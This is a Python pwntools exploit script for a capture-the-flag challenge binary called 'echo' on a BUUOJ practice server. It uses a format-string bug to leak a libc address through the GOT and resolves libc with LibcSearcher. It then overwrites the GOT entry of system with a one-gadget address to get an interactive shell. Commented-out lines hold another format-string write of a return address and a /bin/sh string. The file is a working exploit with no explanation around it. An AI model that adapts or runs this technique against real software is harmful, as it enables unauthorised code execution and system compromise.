#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.01 09.07.40
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
from LibcSearcher import*
context.arch = 'i386'


host = '1.1.1.1'
port = 10000
local = 0	
if local:
	# context.log_level = 'debug'
	libc=ELF('/lib/i386-linux-gnu/libc.so.6')
	elf = ELF('./echo')
	sh = process('./echo')
else:
	#context.log_level = 'debug'
	libc=ELF('./lic-2.23_32.so')
	elf = ELF('./echo')
	sh = remote('node3.buuoj.cn',29608)



def pwn():
	sh.sendline('%8$s'+p32(elf.got['__libc_start_main']))
	libc_start_main_addr = u32(sh.recv(4))
	libc_s =LibcSearcher('__libc_start_main',libc_start_main_addr)
	libc_addr = libc_start_main_addr - libc_s.dump('__libc_start_main')
	success('libc_start_main_addr:0x%x'%(libc_start_main_addr))
	success('libc_addr:0x%x'%(libc_addr))
	# gdb.attach(sh)
	
	# sh.sendline('AAAA%9$s' + p32(elf.got['setvbuf']))
	# sh.recvuntil('AAAA')
	# setvbuf_addr = u32(sh.recv(4))
	# success('setvbuf_addr:0x%x'%(setvbuf_addr))
	# libc_s = LibcSearcher('setvbuf',setvbuf_addr)
	# libc_addr = setvbuf_addr - libc_s.dump('setvbuf')
	# onegad = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
	onegad = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5]
	onegadget = libc_addr + onegad[0]

	payload = fmtstr_payload(7,{elf.got['system']:onegadget})
	sh.sendline(payload)
	# gdb.attach(sh,'b*0x080485E4')
	sh.sendline('exit')
	# buff_addr = libc_addr + libc_s.dump('str_bin_sh')
	# gdb.attach(sh)
	# sh.sendline('%13$pAAA/bin/sh\x00')
	# buff_addr = int(sh.recvuntil('AAA',drop=1),16) - 0xc4
	# ret_addr = buff_addr + 0x110

	# success("buff_addr:0x%x"%(buff_addr))
	# success("ret_addr:0x%x"%(ret_addr))
	# system_addr = 0x8048400
	# payload = '%33792c%11$hnAAA' + p32(ret_addr)	

	# # payload = '%76$pAAA'
	# # gdb.attach(sh)
	# sh.sendline(payload)

	# payload = '%2052c%10$hn' + p32(ret_addr+2)
	# # gdb.attach(sh)
	# sh.sendline(payload)
	# system_argv_addr = ret_addr + 0xc
	# success('system_argv_addr:0x%x'%(system_argv_addr))
	# low_addr = int(str(hex(buff_addr + 0x18))[6:],16)
	# high_addr = int(str(hex(buff_addr+ 0x18))[2:6],16)
	# success('low_addr:0x%x'%(low_addr))
	# # sh.sendline(pay)
	# # payload = '%{:d}c%hn$10n%{:d}c%hn$11n'.format(low_addr,off)
	
	# payload = fmtstr_payload(9,{system_argv_addr:low_addr},write_size='short')
	# bin_sh_addr = buff_addr + len(payload)
	# success('bin_sh_addr:0x%x'%(bin_sh_addr))
	# sh.sendline(payload) 
	# payload = fmtstr_payload(9,{system_argv_addr+2:high_addr},write_size='short') + '/bin/sh\x00'
	
	# sh.sendline(payload)
	# gdb.attach(sh,'b*0x080485E4')
	# sh.sendline('exit')
if __name__ == '__main__':
	pwn()
	sh.interactive()

